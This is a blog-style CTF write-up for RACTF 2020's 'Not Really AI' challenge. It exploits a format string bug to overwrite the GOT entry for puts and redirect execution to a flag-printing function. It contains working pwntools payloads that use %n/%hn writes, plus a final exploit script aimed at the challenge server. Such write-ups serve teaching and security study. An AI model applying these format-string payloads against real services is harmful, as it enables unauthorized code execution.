---
layout: post
title:  "Not Really AI"
date:   2020-06-11 12:13:37 -0300
categories: [CTF,PWN,RACTF 2020]
author: rogeriobastos
event: "RACTF 2020"
tags: [CTF,PWN,RACTF 2020]
description: "Writeup Not Really AI"
image: ""
---

# RACTF 2020

## Not Really AI (binary)

### Description

> Exploit the service to get the flag.
>
> [nra](nra)

200 points

### Solution Summary

Exploit format string vulnerability [1](https://medium.com/swlh/binary-exploitation-format-string-vulnerabilities-70edd501c5be) to overwrite GOT [2](https://ropemporium.com/guide.html#Appendix%20A) and redirect code execution so that _flaggy_ function is executed.

### Walkthrough

The binary is a 32bits file with no protection.

```
$ pwn checksec nra
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

The program read some user data but there isn't buffer overflow.

```
$ ./nra 
How are you finding RACTF?
bla                    <= READ DATA
I am glad you
bla                    <= PRINT IT

We hope you keep going!
```

However it prints the input data in an insecurely way leading to format string attack.

```
printf@plt (
   [sp + 0x0] = 0xffffd210 → "my input data\n",
   [sp + 0x4] = 0x00000200
)
```

And there is a call to _puts_ after that, so you can replace the address of _puts_ in GOT by the address of _flaggy_ function
This way _flaggy_ will be executed when program calls _puts_.

```
=> 0x08049225 <+99>:	call   0x8049030 <printf@plt>
   0x0804922a <+104>:	add    esp,0x10
   0x0804922d <+107>:	sub    esp,0xc
   0x08049230 <+110>:	lea    eax,[ebx-0x1fcf]
   0x08049236 <+116>:	push   eax
   0x08049237 <+117>:	call   0x8049060 <puts@plt>

```

You can get the address of _flaggy_ function and GOT entries using GDB:

```
gef➤  b * main
gef➤  run
[...]
gef➤  print flaggy
$3 = {<text variable, no debug info>} 0x8049245 <flaggy>
[...]
gef➤  got

GOT protection: Partial RelRO | GOT functions: 8
 
[...]
[0x804c018] puts@GLIBC_2.0  →  0x8049066
[...]

```

### Exploit

First of all you have to find the offset in stack to the string you provide as input data. Using `AAAA%N$x` as input data, where `N` is number that will be incremented in a loop. When program prints `41414141` (`AAAA` in hex) you find the right position.

```python
from pwn import *

context.log_level = 'error'

for i in range(10):
    sh = process('./nra')
    sh.readline()
    sh.sendline(f'AAAA%{i}$x')
    sh.readline()
    print(f'%{i}$x', sh.readline().decode()[4:], end='')
```

Looking at the output you find `41414141` when `N` is `4`. So you can refer to the first four bytes using `4$` in format string.

```
%0$x %0$x
%1$x 200
%2$x f7f2b5c0
%3$x 80491d1
%4$x 41414141
%5$x 78243525
%6$x a2e5000a
%7$x f7fa5198
%8$x 0
%9$x f7f923ec
```

Now you can use the memory address of where you want to write as first four bytes followed by a format string who will write the address of _flaggy_ function.

I start with the follow payload, but the program output is so long that it only works locally. Connection to the CTF server is droped before flag is printed.

```python
payload =  p32(0x0804c018)         # elf.got['puts']

payload += b'aaaaa%134517308d%4$n' # %4$n writes 0x08049245 (address of flaggy function)
```

By using length modifier, you are able to control the amount of data written by
the `%n` formatter, so you can write a byte, two-bytes, four-bytes and so on. 
I decide to write two-bytes (halt address) in `0x0804c018` and two-bytes (the
other halt) in `0x0804c018 + 2`, this way the program output is smaller and I
get the flag.

```python
payload =  p32(0x0804c018)         # elf.got['puts']

payload += p32(0x0804c01a)         # elf.got['puts'] + 2

payload += b'%2044d%5$hn'          # writes 0x0804

payload += b'%35393d%4$hn'         # writes 0x9245
```

The final exploit was:


```python
from pwn import *

payload =  p32(0x0804c018)         # elf.got['puts']

payload += p32(0x0804c01a)         # elf.got['puts'] + 2

payload += b'%2044d%5$hn'          # writes 0x0804

payload += b'%35393d%4$hn'         # writes 0x9245


#sh = process('./nra')
sh = remote('88.198.219.20', 62051)
sh.readline()
sh.sendline(payload)
sh.stream()
```
